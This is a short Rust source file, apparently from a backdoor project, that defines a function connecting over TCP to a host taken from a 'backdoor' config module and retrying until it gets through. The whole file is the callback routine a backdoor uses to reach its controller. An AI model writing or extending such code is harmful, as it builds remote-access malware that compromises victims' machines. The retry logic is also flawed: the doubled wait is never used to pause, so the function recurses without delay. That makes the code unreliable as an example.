use std::net::TcpStream;
use crate::backdoor::config::{HOST};

pub fn establish_connection(mut wait: i64) -> TcpStream {
    if wait > 1800 { wait = 1800 }
    
    if let Ok(stream) = TcpStream::connect(HOST) {
        println!("Connected to the server!");
        return stream;
    } else {
        establish_connection(wait * 2)
    }
}
